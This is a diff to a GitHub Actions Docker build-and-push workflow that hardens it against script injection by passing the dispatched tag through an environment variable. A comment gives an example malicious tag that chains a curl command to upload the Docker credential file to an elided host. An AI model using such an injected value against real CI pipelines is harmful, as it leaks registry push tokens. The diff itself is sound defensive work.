@@ -17,20 +17,21 @@ permissions:
 jobs:
   build-test-push:
     runs-on: ubuntu-latest
+    # The dispatch input reaches the shells as an ENVIRONMENT VARIABLE, never as
+    # ${{ }} inside a `run:` block. Expression syntax is substituted textually
+    # before bash parses the line, so a tag of `v1 ; curl -d @$HOME/.docker/
+    # config.json https://...` would execute - and the Docker Hub login step runs
+    # first, so that file holds a live push token. Only someone with repo write
+    # access can dispatch this, so it is hardening rather than an open hole, but
+    # it is the pattern actionlint and CodeQL flag and there is no reason to keep it.
+    env:
+      TARGET_TAG: ${{ inputs.target_tag }}
 
     steps:
     - name: Checkout repository
       uses: actions/checkout@v7
       with:
         ref: ${{ inputs.target_tag }}
-
-    - name: Verify Tag Exists
-      run: |
-        if ! git rev-parse -q --verify "refs/tags/${{ inputs.target_tag }}"; then
-          echo "Error: Tag '${{ inputs.target_tag }}' not found in the repository."
-          exit 1
-        fi
-        echo "Successfully checked out tag: ${{ inputs.target_tag }}"
 
     - name: Log in to Docker Hub
       uses: docker/login-action@v4
@@ -40,12 +41,12 @@ jobs:
 
     - name: Build the Docker image
       run: |
-        docker build --no-cache -t i7gamer/spotify-tracker:${{ inputs.target_tag }} .
+        docker build --no-cache -t "i7gamer/spotify-tracker:$TARGET_TAG" .
 
     - name: Test container startup and health
       run: |
         echo "Starting container..."
-        docker run -d --name test-tracker i7gamer/spotify-tracker:${{ inputs.target_tag }}
+        docker run -d --name test-tracker "i7gamer/spotify-tracker:$TARGET_TAG"
         
         # Check if the image has a healthcheck defined
         HAS_HEALTHCHECK=$(docker inspect -f '{{if .Config.Healthcheck}}yes{{else}}no{{end}}' test-tracker)
@@ -96,4 +97,4 @@ jobs:
     - name: Push Docker image
       run: |
         echo "Pushing image..."
-        docker push i7gamer/spotify-tracker:${{ inputs.target_tag }}
+        docker push "i7gamer/spotify-tracker:$TARGET_TAG"
